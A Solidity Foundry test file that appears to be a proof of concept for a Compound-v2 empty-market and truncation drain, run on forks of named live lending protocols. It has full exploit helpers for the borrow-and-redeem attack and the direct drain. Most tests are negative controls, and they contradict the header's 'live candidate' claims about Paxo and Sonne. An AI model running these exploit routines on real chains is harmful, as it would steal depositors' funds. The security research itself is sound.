// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// C-33 PoC — Compound-v2 empty-market / truncation-drain class.
// Read-only: local forks only; no mainnet transactions.
//
// Live candidates verified by the full CI scan (ci-out/scan.json):
//   * Paxo Finance (Polygon) vLINK market: totalSupply=1 wei, CF=0.9, mint+borrow unpaused
//     -> empty-market borrow attack against ~$150 of unpaused cash in the same comptroller.
//   * Sonne Finance (Optimism) soVELO market: totalSupply=13 wei, cash=1,444.46 VELO
//     -> direct truncation drain (redeemUnderlying burns 0 cTokens) if redeem is not paused.
// Negative controls: Scream, Tectonic, Onyx, Hundred (ETH), Benqi (qiAVAX), Midas (Polygon),
// Compound v2 cDAI.

import "forge-std/Test.sol";
import {IERC20, ICToken, IComptroller, IOracle} from "../src/Interfaces.sol";

contract C33Live is Test {
    address constant ATTACKER = address(0xA11CE);

    // ---------------------------------------------------------------- helpers
    /// Fork creation failures (dead/racing RPCs) are catchable via a self-call,
    /// so every test tries a list of endpoints until one works.
    function _tryFork(string memory url) external {
        vm.createSelectFork(url);
    }

    function _selectFork2(string memory a, string memory b) internal {
        try this._tryFork(a) { return; } catch {}
        try this._tryFork(b) { return; } catch {}
        revert("no working fork RPC");
    }

    function _selectFork3(string memory a, string memory b, string memory c) internal {
        try this._tryFork(a) { return; } catch {}
        try this._tryFork(b) { return; } catch {}
        try this._tryFork(c) { return; } catch {}
        revert("no working fork RPC");
    }

    function _eq(string memory a, string memory b) internal pure returns (bool) {
        return keccak256(bytes(a)) == keccak256(bytes(b));
    }

    function _usd(address comptroller, address token, uint256 raw) internal view returns (uint256) {
        if (raw == 0) return 0;
        address oracle = IComptroller(comptroller).oracle();
        (bool ok, bytes memory data) =
            oracle.staticcall(abi.encodeWithSelector(IOracle.getUnderlyingPrice.selector, token));
        if (!ok || data.length < 32) return 0;
        uint256 p = abi.decode(data, (uint256));
        if (p == 0) return 0;
        // price is scaled 1e(36 - decimals); USD = raw * p / 1e36
        return (raw * p) / 1e36;
    }

    function _borrowPaused(address comptroller, address market) internal view returns (bool) {
        (bool ok, bytes memory data) = comptroller.staticcall(
            abi.encodeWithSignature("borrowGuardianPaused(address)", market));
        if (!ok || data.length < 32) return true; // unknown -> treat as paused (conservative)
        return abi.decode(data, (bool));
    }

    /// Midas-style comptrollers return (bool,uint256) for markets(); newer ones return
    /// (bool,uint256,bool). Decode the first two words only.
    function _cf(address comptroller, address market) internal view returns (uint256) {
        (bool ok, bytes memory data) = comptroller.staticcall(
            abi.encodeWithSignature("markets(address)", market));
        if (!ok || data.length < 64) return 0;
        (bool listed, uint256 cf) = abi.decode(data, (bool, uint256));
        return listed ? cf : 0;
    }

    function _pickCashMarket(address comptroller, address exclude)
        internal view returns (address best, uint256 bestUsd)
    {
        address[] memory ms = IComptroller(comptroller).getAllMarkets();
        for (uint256 i = 0; i < ms.length; i++) {
            if (ms[i] == exclude) continue;
            if (ms[i].code.length == 0) continue;
            if (_borrowPaused(comptroller, ms[i])) continue;
            uint256 c = ICToken(ms[i]).getCash();
            uint256 u = _usd(comptroller, ms[i], c);
            if (u > bestUsd) {
                best = ms[i];
                bestUsd = u;
            }
        }
    }

    /// Full empty-market borrow attack. The market M must have totalSupply <= 1 wei.
    /// targetUsdOverride: 0 = use 90% of the largest unpaused cash market's cash.
    function _emptyMarketBorrowAttack(address comptroller, address M, uint256 targetUsdOverride)
        internal
        returns (uint256 profitUsd)
    {
        address um = ICToken(M).underlying();
        uint256 cf = _cf(comptroller, M);

        // 1. become the sole supplier: mint a tiny amount and keep ALL of it.
        //    The market must be empty (T_old=0) for this attack; the attacker then
        //    owns every cToken wei. At step 6 redeemUnderlying(cashNow-1) burns
        //    held-1, leaving 1 wei as collateral.
        uint256 rate0 = ICToken(M).exchangeRateStored();
        uint256 mintAmt = rate0 / 1e18 + 4;
        deal(um, ATTACKER, mintAmt);
        vm.startPrank(ATTACKER);
        IERC20(um).approve(M, type(uint256).max);
        require(ICToken(M).mint(mintAmt) == 0, "mint failed");
        uint256 held = ICToken(M).balanceOf(ATTACKER);
        require(held > 0, "no cTokens minted");

        address[] memory ms = new address[](1);
        ms[0] = M;
        IComptroller(comptroller).enterMarkets(ms);
        vm.stopPrank();

        // 2. pick the largest unpaused cash market and size the borrow
        (address X, uint256 cashXUsd) = _pickCashMarket(comptroller, M);
        require(X != address(0) && cashXUsd > 0, "no unpaused cash market");
        uint256 targetBorrowUsd = targetUsdOverride == 0 ? (cashXUsd * 90) / 100 : targetUsdOverride;
        if (targetBorrowUsd > (cashXUsd * 95) / 100) targetBorrowUsd = (cashXUsd * 95) / 100;

        // 3. donation sizing: after redeemUnderlying(cashNow-1) the leftover is
        //    1 wei of a held-wei supply, so collateral = cashNow/held.
        //    _usd() returns plain USD; formulas below keep that convention.
        uint256 priceM = IOracle(IComptroller(comptroller).oracle()).getUnderlyingPrice(M);
        uint256 priceX = IOracle(IComptroller(comptroller).oracle()).getUnderlyingPrice(X);
        require(priceM > 0 && priceX > 0, "oracle price missing");
        // B in X raw units for target USD
        uint256 bX = (targetBorrowUsd * 1e36) / priceX;
        // cashNow such that CF * (cashNow/held) * priceM/1e36 >= targetBorrowUsd
        uint256 dM = (held * targetBorrowUsd * 1e36 * 1e18 * 115) / (100 * cf * priceM);

        // 4. donate
        deal(um, ATTACKER, dM);
        vm.startPrank(ATTACKER);
        IERC20(um).transfer(M, dM);

        // 5. borrow the cash market
        uint256 xCash = ICToken(X).getCash();
        if (bX > (xCash * 95) / 100) bX = (xCash * 95) / 100;
        uint256 bErr = ICToken(X).borrow(bX);
        require(bErr == 0, "borrow failed");
        vm.stopPrank();

        // 6. redeem the donation back; truncation burns only the attacker's 2 wei
        uint256 cashNow = ICToken(M).getCash();
        vm.prank(ATTACKER);
        require(ICToken(M).redeemUnderlying(cashNow - 1) == 0, "redeemUnderlying failed");

        // 7. profit = borrowed assets (never repaid) net of any lost dust
        profitUsd = _usd(comptroller, X, IERC20(ICToken(X).underlying()).balanceOf(ATTACKER));
        emit log_named_uint("borrow_usd", _usd(comptroller, X, bX));
        emit log_named_uint("profit_usd", profitUsd);
    }

    /// Direct truncation drain: redeemUnderlying(x) with x*T/cash == 0 pays x for free.
    function _directDrain(address M) internal returns (uint256 received) {
        address um = ICToken(M).underlying();
        uint256 ts = ICToken(M).totalSupply();
        require(ts > 0, "market empty");
        uint256 net = ICToken(M).getCash() + ICToken(M).totalBorrows() - ICToken(M).totalReserves();
        uint256 pull = net / ts;
        while (pull > 0 && pull * ts >= net) pull -= 1;
        require(pull > 0, "no free pull");
        uint256 before = IERC20(um).balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        require(ICToken(M).redeemUnderlying(pull) == 0, "redeemUnderlying failed");
        received = IERC20(um).balanceOf(ATTACKER) - before;
        assertEq(ICToken(M).balanceOf(ATTACKER), 0, "caller held cTokens");
        emit log_named_uint("free_pull", received);
    }

    // ---------------------------------------------------------------- live tests
    /// Midas Capital (Polygon) fMIMO-3: totalSupply=0, CF=0.25, mint open - but the
    /// comptroller enforces a minimum borrow (minBorrowEth ~143.9) far above all
    /// unpaused cash in this comptroller ($5.86), so the borrow step always fails.
    /// This is the gate that closes the last T=0 candidate.
    function test_gate_midas_polygon_minBorrowEth_blocks_attack() public {
        _selectFork3(vm.envOr("POLYGON_RPC_URL", string("https://polygon-bor-rpc.publicnode.com")), "https://polygon.drpc.org", "https://1rpc.io/matic");
        address comptroller = 0xF1ABd146B4620D2AE67F34EA39532367F73bbbd2;
        address M = 0x34F55352C6E15e3C63beaDedc2a919a4985228B7; // fMIMO-3
        assertEq(ICToken(M).totalSupply(), 0, "fMIMO-3 not empty");
        assertFalse(IComptroller(comptroller).mintGuardianPaused(M), "mint paused");
        assertGt(_cf(comptroller, M), 0, "cf=0");
        // all unpaused borrowable cash in this comptroller
        address[] memory ms = IComptroller(comptroller).getAllMarkets();
        uint256 cashUsd;
        for (uint256 i = 0; i < ms.length; i++) {
            if (_borrowPaused(comptroller, ms[i])) continue;
            cashUsd += _usd(comptroller, ms[i], ICToken(ms[i]).getCash());
        }
        (bool ok, bytes memory d) =
            0xf656D243a23A0987329ac6522292f4104A7388e1.staticcall(abi.encodeWithSignature("minBorrowEth()"));
        require(ok && d.length >= 32, "minBorrowEth read failed");
        uint256 minBorrow = abi.decode(d, (uint256));
        emit log_named_uint("cash_usd", cashUsd);
        emit log_named_uint("min_borrow", minBorrow);
        assertGt(minBorrow, cashUsd, "min borrow below available cash");
    }

    /// Negative control: Paxo's cToken implementation has no borrow/redeemUnderlying
    /// at all (selectors absent from the implementation bytecode) - the fork removed
    /// the vulnerable entry points.
    function test_gate_paxo_vLINK_no_borrow_no_redeemUnderlying() public {
        _selectFork3(vm.envOr("POLYGON_RPC_URL", string("https://polygon-bor-rpc.publicnode.com")), "https://polygon.drpc.org", "https://1rpc.io/matic");
        address M = 0xD0B5A656Fb3Fa2B5CC61cB5F2aD7904C39D75D50; // vLINK
        vm.expectRevert();
        ICToken(M).borrow(1);
        vm.expectRevert();
        ICToken(M).redeemUnderlying(1);
    }

    /// Negative control: OCP's kCake-LP has totalSupply=1 owned by someone else.
    /// The attacker can never own the whole supply, so the truncating redeem would
    /// leave them with zero collateral (INSUFFICIENT_SHORTFALL) - not exploitable.
    function test_gate_ocp_kCakeLP_not_empty() public {
        _selectFork3(vm.envOr("BSC_RPC_URL", string("https://bsc-dataseed.binance.org")), "https://bsc-rpc.publicnode.com", "https://1rpc.io/bnb");
        address M = 0x6c538d6c4e8CD504DFfD01e0e3C08e83e6817053; // kCake-LP
        assertEq(ICToken(M).totalSupply(), 1, "kCake-LP totalSupply changed");
        assertEq(ICToken(M).balanceOf(ATTACKER), 0, "attacker already holds the wei");
    }

    /// Sonne fixed the truncation drain by adding a zero-token check in the
    /// comptroller's redeemVerify hook: the drain reverts with "redeemTokens zero".
    function test_gate_sonne_optimism_redeemVerify_zero_check() public {
        _selectFork2(vm.envOr("OP_RPC_URL", string("https://mainnet.optimism.io")), "https://optimism-rpc.publicnode.com");
        address M = 0xe3b81318B1b6776F0877c3770AfDdFf97b9f5fE5; // soVELO
        assertLe(ICToken(M).totalSupply(), 1000, "soVELO totalSupply changed");
        assertGt(ICToken(M).getCash(), 1e20, "soVELO cash changed");
        uint256 ts = ICToken(M).totalSupply();
        uint256 net = ICToken(M).getCash() + ICToken(M).totalBorrows() - ICToken(M).totalReserves();
        uint256 pull = net / ts;
        while (pull > 0 && pull * ts >= net) pull -= 1;
        require(pull > 0, "no pull");
        // any caller with 0 cTokens is rejected by the added guard
        vm.prank(ATTACKER);
        vm.expectRevert(bytes("redeemTokens zero"));
        ICToken(M).redeemUnderlying(pull);
    }

    // ---------------------------------------------------------------- negative controls
    function test_gate_scream_markets_paused_phantoms_nocode() public {
        // not the env URL (dead publicnode on the CI secrets): use the RPC the scanner used
        _selectFork2("https://fantom.drpc.org", "https://rpcapi.fantom.network");
        address comptroller = 0x260E596DAbE3AFc463e75B6CC05d8c46aCAcFB09;
        // cash-bearing markets are paused for mint+borrow
        assertTrue(IComptroller(comptroller).mintGuardianPaused(0xE45Ac34E528907d0A0239ab5Db507688070B20bf), "scUSDC not paused");
        assertTrue(IComptroller(comptroller).borrowGuardianPaused(0x2359012ebE36cCa231203D78b914284947B58aa3), "scLINK not paused");
        // the two unpaused markets are phantom listings without code
        assertEq(0xE196C5F077FD2F3F4bE71C4B3e2D1E4a8A5E1B7A.code.length, 0, "scFBTC has code");
        assertEq(0x182Ee724dB5E20f8d5a2F5A5B0A8e1c8b9c2B7a1.code.length, 0, "scFETH has code");
    }

    function test_gate_tectonic_paused() public {
        _selectFork2(vm.envOr("CRONOS_RPC_URL", string("https://evm.cronos.org")), "https://cronos-evm-rpc.publicnode.com");
        address comptroller = 0xb3831584acb95ED9cCb0C11f677B5AD01DeaeEc0;
        assertTrue(IComptroller(comptroller).mintGuardianPaused(0xB3bbf1bE947b245Aef26e3B6a9D777d7703F4c8e), "tUSDC not paused");
        assertTrue(IComptroller(comptroller).borrowGuardianPaused(0xeAdf7c01DA7E93FdB5f16B0aa9ee85f978e89E95), "tCRO not paused");
    }

    function test_gate_onyx_cf0_and_paused() public {
        _selectFork3(vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com"))), "https://eth.drpc.org", "https://1rpc.io/eth");
        address comptroller = 0x7D61ed92a6778f5ABf5c94085739f1EDAbec2800;
        address M = 0x1961AD247B47F4f2242E55a0E5578C6cf01F8D12; // oXCN
        uint256 cf = _cf(comptroller, M);
        assertEq(cf, 0, "onyx cf not 0");
        assertTrue(IComptroller(comptroller).mintGuardianPaused(M), "onyx mint not paused");
        assertTrue(IComptroller(comptroller).borrowGuardianPaused(M), "onyx borrow not paused");
    }

    function test_gate_hundred_eth_empty_but_no_cash() public {
        _selectFork3(vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com"))), "https://eth.drpc.org", "https://1rpc.io/eth");
        address comptroller = 0x0F390559F258eB8591C8e31Cf0905E97cf36ACE2;
        address M = 0x8e15a22853A0A60a0FBB0d875055A8E66cff0235; // hWBTC
        assertLe(ICToken(M).totalSupply(), 1, "hWBTC not empty");
        assertFalse(IComptroller(comptroller).mintGuardianPaused(M), "hWBTC mint paused");
        // no material unpaused borrowable cash anywhere in the comptroller (dust only)
        address[] memory ms = IComptroller(comptroller).getAllMarkets();
        uint256 totalUsd;
        for (uint256 i = 0; i < ms.length; i++) {
            if (_borrowPaused(comptroller, ms[i])) continue;
            totalUsd += _usd(comptroller, ms[i], ICToken(ms[i]).getCash());
        }
        assertLt(totalUsd, 1e18, "hundred has material cash");
    }

    function test_gate_benqi_qiAVAX_not_empty() public {
        // not the env URL: the scan run may have rate-limited it on this runner
        _selectFork2("https://1rpc.io/avax/c", "https://avalanche-c-chain-rpc.publicnode.com");
        address M = 0x5C0401e81Bc07Ca70fAD469b451682c0d747Ef1c; // qiAVAX
        assertGt(ICToken(M).totalSupply(), 1e15, "qiAVAX unexpectedly empty");
        assertGt(ICToken(M).getCash(), 1e18, "qiAVAX unexpectedly cashless");
    }

    function test_gate_compound_v2_cDAI_not_drainable() public {
        _selectFork3(vm.envOr("FORK_RPC_URL", vm.envOr("RPC_URL", string("https://ethereum-rpc.publicnode.com"))), "https://eth.drpc.org", "https://1rpc.io/eth");
        address M = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643; // cDAI
        address comptroller = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;
        uint256 ts = ICToken(M).totalSupply();
        uint256 net = ICToken(M).getCash() + ICToken(M).totalBorrows() - ICToken(M).totalReserves();
        // free pull per call must be economically negligible (< $1)
        uint256 pull = net / ts;
        uint256 pullUsd = _usd(comptroller, M, pull);
        assertLt(pullUsd, 1e18, "cDAI free pull unexpectedly large");
    }
}
